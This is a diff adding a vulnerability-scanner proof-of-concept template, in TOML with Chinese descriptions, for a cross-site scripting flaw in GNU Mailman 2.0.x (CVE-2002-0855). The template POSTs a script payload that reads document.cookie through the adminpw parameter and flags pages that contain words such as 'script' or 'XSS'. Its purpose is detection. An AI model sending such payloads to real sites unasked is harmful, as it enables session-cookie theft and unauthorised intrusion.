@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "检测 GNU Mailman 2.0.x 版本中的 XSS 漏洞，攻击者可通过订阅者的列表订阅选项中的 adminpw 或 info 参数向 ml-name 功能注入恶意脚本。"
+id = "POC-AVE-2002-0275"
+name = "GNU Mailman 跨站脚本漏洞 PoC"
+severity = "high"
+tags = ["ave-2002-0275"]
+vuln_id = [
+    "CVE-2002-0855",
+    "AVE-2002-0275",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/ml-name"
+protocol = "http"
+
+[poc.requests.body]
+content = "adminpw=<script>alert(document.cookie)</script>&info=test"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Cross-site scripting",
+    "XSS",
+    "script",
+]
